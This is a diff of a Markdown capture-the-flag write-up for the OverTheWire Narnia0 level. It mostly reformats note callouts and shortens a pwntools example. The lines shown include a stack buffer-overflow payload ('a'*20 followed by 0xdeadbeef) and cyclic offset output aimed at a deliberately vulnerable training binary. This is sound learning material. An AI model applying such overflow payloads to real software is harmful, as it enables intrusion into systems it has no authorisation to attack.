@@ -1,6 +1,6 @@
 
 
-> [! Note]
+> [!Note]
 > These binaries are compiled on a local environment with vulnerable functions and it is intended to train and learn, the setup may vary from the actual binaries located at narnia.labs.overthewire.org
 
 ## Narnia0
@@ -71,7 +71,7 @@ user@rapberrypi:~/Desktop/raspberrypi5/32Bit$ pwn cyclic -o 100 -l 0x61616166
 20 # <-- It takes 20 characters to fill the buffer and over write the lookedup variable
 ```
 
->[! Note]
+>[!Note]
 > x86 - 32 Bit ; LE (Little Endian) from `readelf -h` output; 
 
 ![[Pasted image 20251204230446.png]]
@@ -699,7 +699,7 @@ Continuing.
 ![[Pasted image 20251205015659.png]]
 #### Passing bytes to program via python
 
->[! Note]
+>[!Note]
 > Most of the writeups uses `python -c 'print "A"*20 + <deadbeef>'` this will not work with python3 
 > Python2 used to handle everything as bytes; but python3 handles everything as strings unless specified explicitly 
 
@@ -728,16 +728,9 @@ Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
 val: 0xdeadbeef
 ```
 
->[! Note]
->Additional quick win from pwntools; `sudo apt-get install python3-pwntools / pip install pwntools`
->```bash
->user@rapberrypi:~/Desktop/narnia $ python3
-Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
->>> from pwn import *
->>> p32(0xdeadbeef)
-b'\xef\xbe\xad\xde'
->>> print(b'a'*20 + p32(0xdeadbeef))
-b'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde'
->>> ```
+>[!Note]
+> Additional quick win from pwntools; `sudo apt-get install python3-pwntools / pip install pwntools`
+> `user@rapberrypi:~/Desktop/narnia $ python3 -c 'from pwn import *; print(b"a"*20 + p32(0xdeadbeef))'`
+> `b'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde'`
+
 
